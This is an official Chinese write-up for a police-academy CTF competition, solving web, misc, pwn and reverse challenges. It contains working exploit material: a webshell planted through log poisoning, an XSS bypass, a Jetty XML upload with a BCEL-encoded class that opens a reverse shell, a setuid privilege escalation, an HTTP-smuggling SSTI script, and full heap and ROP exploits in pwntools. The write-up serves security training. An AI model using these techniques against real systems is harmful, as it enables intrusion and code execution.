# 第三届黄河流域公安院校网络空间安全技能挑战赛官方Writeup

> 原文: https://www.ctfiot.com/249193.html
> ID: 249193

WEB

奶龙牌图片处理器

未过滤.user.ini文件
试用.user.ini文件进行包含，但是过滤了`<?`和`php`
所以可以尝试进行包含日志文件`/var/log/nginx/access.log`auto_prepend_file=/var/log/nginx/access.log然后在UA头写马

外国山海经

本意是绕过CSP限制执行JavaScript。无奈被写的bot演了搞了个js混淆导致很多非预期，心疼shql师傅

默认情况下max_input_vars的值是1000，也就是PHP最多接受1000个参数。一旦超过这个数量，PHP就会出错并产生一个Warning。Docker PHP环境默认的error_reporting是空，即为E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED，会显示除了E_NOTICE、E_STRICT、E_DEPRECATED以外的所有错误信息。

由于参数解析过程发生在脚本执行以前，错误信息写入response会导致header()函数执行出错，最终CSP头无法输出，XSS成功执行

除了1000参数外其实还有20文件

import requestsfrom io import BytesIO
upload_url = "http://175.27.229.115:
16345/flag.php?keyword=<svg onload=alert()>"
files = {}for i in range(1, 22):    filename = f'file{i}.txt'    content = f'这是第{i}个文件'.encode('utf-8')    files[f'file{i}'] = (filename, BytesIO(content))
response = requests.post(upload_url, files=files)

if response.ok:    html = response.text    print(html)    with open('response.html', 'w', encoding='utf-8') as f:        f.write(html)    print('上传成功，响应保存到 response.html')else:    print('上传失败，状态码:', response.status_code)

Message Board

/a/b/..%00/WEB-INF/web.xml/.%00/WEB-INF/web.xml

发现仅m1xian可访问/fileload

注册账号登陆后，在welcome.jsp的注释中泄露了登录时验证的逻辑

private boolean isValidUser(String username, String password){try (BufferedReader reader = new BufferedReader(new FileReader("/var/lib/jetty/webapps/root/"+FILE_NAME))) {        String line;while ((line = reader.readLine()) != null) {            String[] parts = line.split("_");if (parts.length == 2 && parts[0].equals(username) && parts[1].equals(password)) {returntrue;            }        }    } catch (IOException e) {        e.printStackTrace();    }returnfalse;}

用户名和密码是用下划线 _ 连接存储

我们注册用户名为：m1xian_a，密码置空，此时就成功将m1xian的密码替换为a

登录后在/fileload存在文件上传

可以继续泄露，存在提示jetty-xml

/%u002e/WEB-INF/lib

可以上传xml文件，xml文件有自己的语法，允许实例化任何对象，并调用getter、setter和方法。但是对内容做了过滤，一般的命令执行都被禁用了，我们可以构造一个加载bcel字节码的payload

<?xml version="1.0"?><!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN""http://www.eclipse.org/jetty/configure_9_3.dtd"><Configure class="org.eclipse.jetty.server.handler.ContextHandler">    <Newid="foo" class="com.sun.org.apache.bcel.internal.util.ClassLoader"></New>
    <Refrefid="foo">        <Callid="test1" name="loadClass">            <Arg>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Rko$d2$60$U$7e$5e$60$U$Y$b8$8d$c96$e7$8d$cd$cb$40$c1F$r$s$86$cdd$99l$99$b6L$85$a0$f8$edmy$85riI$v$e32$f7$7b$fc$bc$_j4$d1$ef$fe$u$e3iG$90d$s6$e9$b9$3c$e7$3c$cf99$ed$af$df$df$7e$A$c8$n$VA$Yk$R$5c$c1z$IW$5d$7fM$c2u$J7$o$I$e2$a6$84$a4$84$N$86$e0$b6a$g$ce3$G$7f$w$5da$I$ecY5$c1$b0$a0$Y$a6$u$f6$3b$9a$b0$cb$5ck$T$SW$y$9d$b7$x$dc6$dc$7c$C$G$9c$86$d1c$d8T$y$bb$$$8b$n$eft$dbB$d6t$d1$7e$q$d7D$c7$ea$c9$D$a1$c9D$d3$f3$M$a1m$bd$3d$Z$c5$88$9aP$9a$fc$98$cb$86$r$l$k$V$86$ba$e8$3a$86eR$5b$ac$e4p$bd$a5$f2$ae7$82$Wf$88$94$ac$be$ad$8b$7d$c3$j$Zv$e5$k$b8$dc$u$o$98$97$b0$Z$c5$z$dcf$e0$g$ef5$92Y$3dy$o$f4$86$95$a9v$f6$c7$7co$d7$e1$a5$dd$fb$_$8c$a7$ad$f7$ef$aa$c7$b5$83$e2$40$Z$X$k$XK$b9Qq$94$h$a9$cdV_$z$X$k$w$e3$c3$b1$3aV$eb$ea$f3$5cG$7d$bd$b3s$fa$f1$84$c4$c4$93$5c$s$5b$3b$8f$h$99$acq$g$c5$j$dceX$fe$c7$e2$M$eb$k$da$e6f$5d$7e$d37$j$a3$p$a6Ew$d1$z$86$e4$ff$8e$c4$b0$f8W$e4Hk$K$ddaX$ba$a0K$H$a9$Lg$9a$qRi$e5B$P$j2$m$86$82$q$b7R3$d5$92c$hf$3d$3fKxe$5b$ba$e8$f5$88$b06$dbYn$d8$d6$c0$fd$C$f9t$F$h$I$d1$af$e4$3e$3e0$f7$ead$a3$94$c9$e4$Z$f9$b9$7b_$c0$ce$bcr$8cl$f0$i$c4$r$b2$d1I$bc$80E$f2$n$yM$c9$l$e0$f7j$ab_$e1$8b$fb$3f$p$f0$f6$Tb$_$bf$pX$r5$e9$e7$99W$MS$eb$i5$ba$b2$x$U$c1$dbd$9e$d00a$R$c2$a2$d311$c2$e2X$a6$ec2$bd$S$7c$8a$84D$98$K$x$def$ab$7f$AS$db$d2$3c$Z$D$A$A</Arg>        </Call>    </Ref>
    <Refrefid="test1">        <Callname="newInstance"></Call>    </Ref>
</Configure>

还需注意在jetty启动部署时存在一个scan线程，其中的一个方法为reportDifferences，该方法作用主要就是扫描webapps下的文件是否存在更新、修改、删除等操作，在判断是新增文件后最终会调用xmlc.configure()对我们的xml文件进行解析，所以我们需要进行目录穿越将xml文件上传到上级webapps目录下

POST /fileload HTTP/1.1Host: 192.168.0.113:
32774Content-Length: 2063Cache-Control: max-age=0Origin: http://192.168.0.113:
32774Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzYxpwivCpwppICh2Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.0.113:
32774/fileloadAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=node0o531w85xhhl76uitrqzmvxrh1.node0Connection: keep-alive
------WebKitFormBoundaryzYxpwivCpwppICh2Content-Disposition: form-data; name="filename"; filename="../exp.xml"Content-Type: text/xml
<?xml version="1.0"?><!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN""http://www.eclipse.org/jetty/configure_9_3.dtd"><Configure class="org.eclipse.jetty.server.handler.ContextHandler">    <Newid="foo" class="com.sun.org.apache.bcel.internal.util.ClassLoader"></New>
    <Refrefid="foo">        <Callid="test1" name="loadClass">            <Arg>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Rko$d2$60$U$7e$5e$60$U$Y$b8$8d$c96$e7$8d$cd$cb$40$c1F$r$s$86$cdd$99l$99$b6L$85$a0$f8$edmy$85riI$v$e32$f7$7b$fc$bc$_j4$d1$ef$fe$u$e3iG$90d$s6$e9$b9$3c$e7$3c$cf99$ed$af$df$df$7e$A$c8$n$VA$Yk$R$5c$c1z$IW$5d$7fM$c2u$J7$o$I$e2$a6$84$a4$84$N$86$e0$b6a$g$ce3$G$7f$w$5da$I$ecY5$c1$b0$a0$Y$a6$u$f6$3b$9a$b0$cb$5ck$T$SW$y$9d$b7$x$dc6$dc$7c$C$G$9c$86$d1c$d8T$y$bb$$$8b$n$eft$dbB$d6t$d1$7e$q$d7D$c7$ea$c9$D$a1$c9D$d3$f3$M$a1m$bd$3d$Z$c5$88$9aP$9a$fc$98$cb$86$r$l$k$V$86$ba$e8$3a$86eR$5b$ac$e4p$bd$a5$f2$ae7$82$Wf$88$94$ac$be$ad$8b$7d$c3$j$Zv$e5$k$b8$dc$u$o$98$97$b0$Z$c5$z$dcf$e0$g$ef5$92Y$3dy$o$f4$86$95$a9v$f6$c7$7co$d7$e1$a5$dd$fb$_$8c$a7$ad$f7$ef$aa$c7$b5$83$e2$40$Z$X$k$XK$b9Qq$94$h$a9$cdV_$z$X$k$w$e3$c3$b1$3aV$eb$ea$f3$5cG$7d$bd$b3s$fa$f1$84$c4$c4$93$5c$s$5b$3b$8f$h$99$acq$g$c5$j$dceX$fe$c7$e2$M$eb$k$da$e6f$5d$7e$d37$j$a3$p$a6Ew$d1$z$86$e4$ff$8e$c4$b0$f8W$e4Hk$K$ddaX$ba$a0K$H$a9$Lg$9a$qRi$e5B$P$j2$m$86$82$q$b7R3$d5$92c$hf$3d$3fKxe$5b$ba$e8$f5$88$b06$dbYn$d8$d6$c0$fd$C$f9t$F$h$I$d1$af$e4$3e$3e0$f7$ead$a3$94$c9$e4$Z$f9$b9$7b_$c0$ce$bcr$8cl$f0$i$c4$r$b2$d1I$bc$80E$f2$n$yM$c9$l$e0$f7j$ab_$e1$8b$fb$3f$p$f0$f6$Tb$_$bf$pX$r5$e9$e7$99W$MS$eb$i5$ba$b2$x$U$c1$dbd$9e$d00a$R$c2$a2$d311$c2$e2X$a6$ec2$bd$S$7c$8a$84D$98$K$x$def$ab$7f$AS$db$d2$3c$Z$D$A$A</Arg>        </Call>    </Ref>
    <Refrefid="test1">        <Callname="newInstance"></Call>    </Ref>
</Configure>------WebKitFormBoundaryzYxpwivCpwppICh2Content-Disposition: form-data; name="submit"Upload------WebKitFormBoundaryzYxpwivCpwppICh2--

成功反弹到shell，之后读取flag需要Capabilities提权

getcap -r / 2>/dev/null

得到java有setuid权限

写入 SetUID.c

写入SetUID.java

编译SetUID.c

编译SetUID.java

执行命令

将/fllag写到1.txt然后访问即可拿到flag

echo "I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9" |base64 -d >/var/lib/jetty/webapps/root/SetUID.cecho "cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvZmxsYWc+L3Zhci9saWIvamV0dHkvd2ViYXBwcy9yb290LzEudHh0In0pOwogICAgfQp9" |base64 -d >/var/lib/jetty/webapps/root/SetUID.javagcc -shared -fPIC -o /var/lib/jetty/webapps/root/libSetUID.so -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux /var/lib/jetty/webapps/root/SetUID.cjavac /var/lib/jetty/webapps/root/SetUID.javajava -Djava.library.path=/var/lib/jetty/webapps/root/ -cp /var/lib/jetty/webapps/root/ SetUID

Try2Crossover

http请求走私+污染capitalize_title过滤器

SSTI payload

{{url_for["__globals__"].__builtins__['exec']("current_app.jinja_env.filters['capitalize'] = lambda filename: open('/flag', 'r').read()",url_for["__globals__"])}}

用current_app获取app,用一个匿名函数覆盖模板中使用的capitalize过滤器,让过滤器执行我们打入的命令读flag.

用这个payload传到author里打进去就能发现title变成flag了.

写个exp发包,因为需要构造http请求,就需要用socket库发包

import socketimport requestsimport sysimport re
ip = str(sys.argv[1])payload = 'title=aa&author={{url_for["__globals__"].__builtins__['exec']("current_app.jinja_env.filters['capitalize'] = lambda filename: open('/flag', 'r').read()",url_for["__globals__"])}}'exp3 = f'''{payload}r'''exp3_len = len(exp3) - 4
# print(exp3_len)
exp2 = f'''xxxxxxxxPOST /add_book HTTP/1.1rHost: localhostrContent-Length:{exp3_len}rContent-Type: application/x-www-form-urlencodedrr'''
exp2_len = len(exp2 + f"{payload}")
# print(exp2_len)
exp1 = f'''GET / HTTP/1.1rHost: localhostrContent-Length: {exp2_len}rSec-Websocket-Key1: xrr'''
final_payload = exp1 + exp2 + exp3
# print(final_payload)final_payload = final_payload.encode()
sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sSocket.connect((ip, 9999))

def send(payload):    #    print(payload)    sSocket.send(payload)    sSocket.settimeout(2)    response = sSocket.recv(2147483647)    while len(response) > 0:        #        print(response.decode())        try:            response = sSocket.recv(2147483647)        
except:            break    sSocket.close()

if __name__ == '__main__':    send(final_payload)    req = requests.get(url=f"http://{ip}:
9999/details/4",)
    match = re.search(r'flag{[^{}]*}', req.text)    if match:        print(match.group())    else:        print("Please restart docker and try again.")

MISC

Pixels Are Your Answer

keyone,010打开是png图片

尾部字符串base32解密

OBUWGOTZGB2TI4RTNAZXEMApic:
y0u4r3h3r

看第二部分

未知文件，经过尝试是加密容器，可以通过对vc容器爆破（passwarekit)，得到弱密码是4321

解压压缩包

得到一张图片

查看图片exif信息

使用过ps,ps打开

发现图片右侧像素被填充过

from PIL import Imageimport numpy as npdef is_black(pixel, threshold=30):  """检查像素是否接近黑色（RGB值均<=threshold）"""  if len(pixel) >= 3: # RGB或RGBA模式    r, g, b = pixel[:3]    return r <= threshold and g <= threshold and b <= threshold  return Falsedef extract_rightmost_columns(image_path, threshold=30):  # 打开图片  img = Image.open(image_path)  img_array = np.array(img)  second_last_col = img_array[:, -2] # 倒数第二列  last_col = img_array[:, -1] # 最后一列  result = []  for i in range(img_array.shape[0]): # 遍历所有行  # 检查是否为接近黑色的像素    second_last_black = is_black(second_last_col[i], threshold)    last_black = is_black(last_col[i], threshold)    if last_black:      result.append('1')    elif second_last_black:      result.append('0')  return ''.join(result)if __name__ == "__main__":  image_path = r""  try:    result = extract_rightmost_columns(image_path, threshold=30)    print("提取结果:", result)    print("结果长度:", len(result))  
except Exception as e:    print("处理出错:", str(e))

提取结果:
00110011001101100011000010110011101111011011110010011000001110101010111110011010001110010001100110101111101110010001100110011010001101100010111110111010001101000001100110101111100110100011011000011001101110010001000010010000101111101结果长度: 233

转换为字符

数学天才

解压压缩包，有加密葵花宝典，一张数独，一个数学天才txt
从数学天才txt中得到信息，解压葵花宝典的密码是数独斜下对角线的数字，而且结合试炼二可以知道要去4换$(这一步本意是防止数独直接被爆破，没想到替换之后依旧可以很快的爆破，被非预期了)
解数独的方法有很多种，这里列举几种：
1. 较慢方法：喂给AI，直接让他解(难度略大，需要合适的提问技巧)
2. 普通方法：从AI得知该数独的名称为Killer Sudoku，于是转为寻找解密脚本(从github中)或网站(https://www.sudokuwiki.org/KillerSudoku.aspx)3. 数学天才：真正的数学天才不需要花里胡哨的操作，直接手搓(数学比较好的一般10min以内就ok)
4. Misc天才：发现可以爆破出密码，使用自定义字符集123$56789爆破即可(仅需10s)
以上方法均可得到密码295$25$23,解压葵花宝典，发现flag被加密了，试炼三则提示60，可以联想到使用rot47和rot13加密，依次解密即可

small_challenge

下载附件，解压缩，是一个图片小小挑战.png，010editor打开可以发现图片后面隐藏的数据，手动提取或binwalk分离，可以得到一个压缩包，解压压缩包发现加密的flag.zip和一张图片2.png
利用脚本异或，或者使用Stegsolve/随波逐流，即可得到一张二维码，是datamatrix码，使用
https://online-barcode-reader.inliteresearch.com/
扫码得到
<E:8E?W^Z<=tEZ)=lP6n>;.Tg>q@+!/6=B)/6_%hLg*.rH<gLN
base85解码得到UV!W_X_YZ,U,Y∈[0,9], V,W,X,Z∈[A,z]
推测为密码规则，使用ziperello，利用该规则掩码爆破flag.zip,得到密码9h!Y_a_8D

耗时两分二十秒

掩码爆破这里也可以使用hashcat，不过可能比ziperello慢一点

输入密码打开flag.txt得到flag{It3_s0_3@syIlIlIIlIllI}

这里想说明一下“看了半天，没有收获？其实亦有收获”这句话，这句话有两层含义，能看懂的算hint了，其一就是“亦有收获”中的“亦”和“获”可以联想到异或，其二就是掩码爆破，如果规则不够恰当，需要较长时间才能爆出来，爆了半天没出来就放弃了，可能再多爆几分钟就出来了，所以多等等便有收获了

破碎的小熊

打开压缩包，是一张图片和一个加密文件

发现图片是bmp格式，于是使用silenteye解密

得到1.md文件，打开是密码?K28|BA4DCBA?Zw，用此密码解压flag.zip,是一个音频文件，使用deepsound提取即可得到flag.png

当然，这里的deepsound提取需要密码，那么密码是什么呢，这里比较难找，其实密码藏在了音频名称里，复制音频名称，对其进行0宽隐写提取即可得到密码QXw73zbdtE，这里本来打算上hint来着，结果有人解出了这道题，那就没法上了

pwn

soeasy

import requestsfrom pwn import *from requests.auth import *import ctypesfrom ctypes import *from structimportpackcontext.log_level='debug'context(os='linux', arch='amd64')io = process('./pwn')elf = ELF('./pwn')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#libcc = cdll.LoadLibrary('./libc.so.6')#libcc.srand(libcc.time(0))def duan():  gdb.attach(io)  pause()context.terminal = ['gnome-terminal','-x','sh','-c'] 
def add(ind,size,content):    io.recv()    io.sendline(str(1))    io.recv()    io.sendline(str(ind))    io.recv()    io.sendline(str(size))    io.recv()    io.sendline(content)
def free(idx):    io.recv()     io.sendline(str(3))    io.recv()    io.sendline(str(idx))def show(idx):    io.recv()    io.sendline(str(2))    io.recv()    io.sendline(str(idx))  def uaf(idx):    io.recv()    io.sendline(str(321))    io.recv()    io.sendline(str(idx))add(0,0x80,b'a')
add(1,0x80,b'a')add(2,0x80,b'a')add(3,0x80,b'a')
add(4,0x80,b'aaaaaaaa')add(5,0x80,b'aaaaaaaa')add(6,0x80,b'aaaaaaaa')add(7,0x80,b'aaaaaaaa')add(8,0x80,b'aaaaaaaa')add(9,0x10,b'/bin/shx00')free(0)free(1)free(2)free(3)free(4)free(5)free(6)uaf(8)free(7)show(8)libc_base = u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))-0x1ecbe0print('libc',hex(libc_base))free_hook = libc_base + libc.sym['__free_hook']malloc_hook = libc_base + libc.sym['__malloc_hook']sys = libc_base + libc.symbols['system']add(10,0x80,b'cccccccc')free(8)payload = b'd'*0x80+p64(0)+p64(0x91)+p64(free_hook)add(11,0xa0,payload)add(12,0x80,b'a')add(8,0x80,p64(sys))free(9)io.interactive()

LaiCai

import requestsfrom pwn import *from requests.auth import *import ctypesfrom ctypes import *from structimportpackcontext.log_level='debug'context(os='linux', arch='amd64')context.terminal = ['gnome-terminal','-x','sh','-c'] def duan():    gdb.attach(io)    pause()
io = process('./pwn')
# io = remote('0.0.0.0', 9999)elf = ELF('./pwn')libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def add(size):    io.sendlineafter(b"choice: n", b'1')    io.sendlineafter(b"size:n", str(size).encode())def free(index):    io.sendlineafter(b"choice: n", b'2')    io.sendlineafter(b":n", str(index).encode())def deposit(index, data):    io.sendlineafter(b"choice: n", b'3')    io.sendlineafter(b":n", str(index).encode())    io.sendafter(b":n", data)def remove(index, data):    io.sendlineafter(b"choice: n", b'4')    io.sendlineafter(b":n", str(index).encode())    io.sendafter(b":n", data)def show(index):    io.sendlineafter(b"choice: n", b'5')    io.sendlineafter(b":n", str(index).encode())io.sendlineafter(b"name:n", b'a')add(0x410)  # 0add(0x1f0)  # 1add(0x1f0)  # 2free(0)add(0x1f0)  # 0show(0)libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1ecfd0environ = libc_base + libc.sym["environ"]success("libc_base: " + hex(libc_base))success("environ: " + hex(environ))free(2)remove(1, b'2272')add(0x1f0) add(0x1f0) deposit(2, p16(1) * 16 + p64(0) * 26 + p64(environ))add(0xf0) show(3)#duan()stack_addr = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) -0x120deposit(2, p16(1) * 16 + p64(0) * 26 + p64(stack_addr))pop_rax = libc_base +  0x36174pop_rdi = libc_base + 0x23b6apop_rsi = libc_base + 0x2601fpop_rdx = libc_base + 0x119431syscall = libc_base + 0x630a9ret = libc_base + 0x9aasuccess("syscall: " + hex(syscall))orw = p64(pop_rax) + p64(2)orw += p64(pop_rax) + p64(2)orw += p64(pop_rdi) + p64(stack_addr + 0xc0)orw += p64(pop_rsi) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(0)orw += p64(pop_rdi) + p64(3)orw += p64(pop_rsi) + p64(stack_addr + 0x100)orw += p64(pop_rdx) + p64(0x50) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(1)orw += p64(pop_rdi) + p64(1)orw += p64(syscall)orw += b'./flagx00x00'add(0xf0)  # 4deposit(4, orw)io.interactive()

小馋猫

开了沙箱的shellcode，只能用一次syscall，并且在执行前关了可读可写权限，把除rip外的所有寄存器都置零了

思路：先mprotect赋予权限，打open + sendfile

用x90对齐机器码后，在syscall的位置写入高位0x05，用汇编命令在rip寄存器指向的低位补0x0f即可正常执行syscall（0x05 0x0f）

from pwn import *context(os = 'linux',log_level = "debug",arch = 'amd64')io = remote("175.27.229.115",7470)#io = process("./pwn")elf = ELF("./pwn")context(os='linux', arch='amd64')

def debug():    gdb.attach(io,'b *$rebase(0x18b5)')    pause()
io.recvuntil(b'fish:')sc1 = """   lea rsp, [rip + 0]      mov rax,10   lea rdi, [rip - 0x45]      mov rsi,0x1000   mov rdx,7   syscall      push 0x67616c66   mov rdi, rsp   mov rax, 2   mov byte ptr [rip],0x0f"""
sc2 = '''   push 1   pop rdi   push 3   pop rsi   push 0   pop rdx   mov r10, 0x100   push 40   pop rax   mov byte ptr [rip],0x0f'''#debug()
pay = b'x00' * 0x30 + asm(sc1) + b'x90x05' + asm(sc2) + b'x90x05'
print(len(pay))io.send(pay)
io.interactive()

stayhere

2.23的堆题，mallopt(1, 0);去除了fastbin，但是还有其他的很多打法

这里使用的off by null + apple2

from pwn import *  context(os='linux', arch='amd64', log_level='debug')  #r = process('./pwn') r = remote('175.27.229.115',7770)  libc = ELF("./libc-2.23.so")  elf = ELF('./pwn') def dbg():    gdb.attach(r,'b *$rebase(0xb37)')    pause()    def cmd(choice):    r.recvuntil(b'choice:')    r.sendline(str(choice).encode())def add(size,cont):    cmd(1)     r.recvuntil(b'Size:')    r.sendline(str(size))    r.recvuntil(b'Content:')    r.send(cont)def delete(idx):    cmd(2)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())def edit(idx,content):    cmd(3)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())    r.recvuntil(b'Content:')    r.send(content)def printf(idx):    cmd(4)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())
def exit():    cmd(113023)
add(0xf8,b'aaaa')  #  0add(0x468,b'bbbb')  # 1add(0xf8,b'cccc')
#    2add(0x18,b'eeee') #   3add(0x550,b'dddd')
#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b' '))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b' ')) -0x62success('chunk_addr:' +hex(chunk_addr))
delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b' ') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b' ') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b' ') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b' ') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b' ') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()

REVERSE

qgd

def convert_hex_to_bin(input_file, output_file):    """    将包含十六进制字符串的文本文件转换为二进制文件    :
param input_file: 输入文本文件路径    :
param output_file: 输出二进制文件路径    """    try:        with open(input_file, 'r') as f:            hex_str = f.read().replace('n', ' ').split()                # 将十六进制字符串转换为字节数组        byte_data = bytes.fromhex(''.join(hex_str))                with open(output_file, 'wb') as f:            f.write(byte_data)                    print(f"成功转换并写入 {len(byte_data)} 字节到 {output_file}")        
except ValueError as e:        print(f"错误：输入包含无效的十六进制字符 - {e}")    
except Exception as e:        print(f"发生错误：{e}")
if __name__ == "__main__":    input_txt = "part1flag.txt"  # 替换为你的输入文件路径    output_bin = "output.bin"  # 替换为你的输出文件路径    convert_hex_to_bin(input_txt, output_bin)

可以接着Ai分析

逻辑为奇数位xor 0x58，偶数位xor 0x31

a=[88 ,47, 80 ,54 ,95 ,57, 90 ,54 ,94, 47]for i in range(len(a)):    if i%2 ==0:        a[i]^=0x31    else:        a[i]^=0x58for i in range(len(a)):    print(chr(a[i]),end='')#iwannaknow

part2:

使用python3.9解包

WOo0.py:
from secret import decrypt

# 测试代码：key = bytes.fromhex("EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD")ciphertext = b"xd4z'0Lx10xcax0bx0bxaax15xbeK0"xbfxb2xc6x05"

cipher = decrypt(ciphertext,key)
a = bytes(input("flag呢"), encoding='utf-8')if a == cipher:    print('没错没错')else:    print('不对不对')

secret.py:
def key_schedule(key: bytes) -> list:    S = list(range(128))    v6 = 0    for j in range(128):        v6 = (S[j] + key[j % len(key)] + v6) % 128        v6 = (v6 ^ 55) % 128        S[j], S[v6] = S[v6], S[j]    return S
def next_byte(state: dict) -> int:    S = state['S']    state['i'] = (state['i'] + 1) % 128    state['j'] = (state['j'] + S[state['i']]) % 128    S[state['i']], S[state['j']] = S[state['j']], S[state['i']]    v2 = S[(S[state['i']] + S[state['j']]) % 128]    return ((16 * v2) | (v2 >> 4)) & 0xFF
def decrypt(ciphertext: bytes, key: bytes) -> bytes:    state = {        'S': key_schedule(key),        'i': 0,        'j': 0    }    plaintext = bytearray()    for byte in ciphertext:        plaintext.append(byte ^ next_byte(state))    return bytes(plaintext)    #what_DO_you_mean#@!

Victory Melody

简单的vm，源码附上

#define _CRT_SECURE_NO_WARNINGS#include<stdio.h>#include<stdlib.h>#include<string.h>
typedefstruct{    unsignedint r1;       unsignedint r2;       unsignedint eip;      unsignedchar mem[256];        unsignedchar code[1024];  } VM;
unsignedchar code[] = {    0x20, 0x10, 0x5b,      0x20, 0x11, 0x58,      0x20, 0x12, 0x56,      0x20, 0x13, 0x6e,      0x20, 0x14, 0x11,     0x20, 0x15, 0x4e,    0x20, 0x16, 0x00,
    0x40,  // scanf("%7s", &mem[0]);
    0x11, 0x21,  // r2 = 0x21    0x10, 0x0,   // r1 = 0    0x30,        // mem[r1] ^= r2    0x10, 0x1,   // r1 = 1    0x30,    0x10, 0x2,   // r1 = 2    0x30,    0x10, 0x3,   // r1 = 3    0x30,    0x10, 0x4,   // r1 = 4    0x30,    0x10, 0x5,    0x30,    0x10, 0x6,    0x30,    0x10, 0x7,    0x30,
    0x50, 0x10, 0x7   // return memcmp(&mem[0], &mem[0x10], 7);};
VM* vm_new(){    VM* vm = (VM*)malloc(sizeof(VM));      memset(vm, 0, sizeof(VM));            memcpy(vm->code, code, sizeof(code));      return vm;}
intvm_run(VM* vm){    char opcode;    char operand_1, operand_2;
    while (1) {        opcode = vm->code[vm->eip];        switch (opcode) {        case0x10:            operand_1 = vm->code[vm->eip + 1];            vm->r1 = operand_1;            vm->eip += 2;            break;
        case0x11:            operand_1 = vm->code[vm->eip + 1];            vm->r2 = operand_1;            vm->eip += 2;            break;
        case0x20:            operand_1 = vm->code[vm->eip + 1];            operand_2 = vm->code[vm->eip + 2];            vm->mem[operand_1] = operand_2;            vm->eip += 3;            break;
        case0x30:            vm->mem[vm->r1] ^= vm->r2;            vm->eip += 1;            break;
        case0x40:            scanf("%7s", &vm->mem[0]);            vm->eip += 1;            break;
        case0x50:            operand_1 = vm->code[vm->eip + 1];            operand_2 = vm->code[vm->eip + 2];            returnmemcmp(&vm->mem[0], &vm->mem[operand_1], operand_2);        }    }}
intmain(){    printf("input sth...n");    VM* vm = vm_new();    if (!vm_run(vm))        printf("Ez right?!  flag is flag{md5(your_input)}n");//flag{ccd5cace2d47f2fc8b3a7c632f5f7b49}    else        printf("Noooon");}

R

魔改RC4

fn crypt(ciphertext: &[u8], key: &[u8]) -> Vec {    let mut s: Vec = (0..=255).collect();    let key_len = key.len();    let mut j = 0u16;
    // Initialize S-box    for i in 0..256 {        let key_byte = key[i % key_len] ^ 0x66;        j = (j + s[i] as u16 + key_byte as u16) % 256;        s.swap(i, j as usize);    }
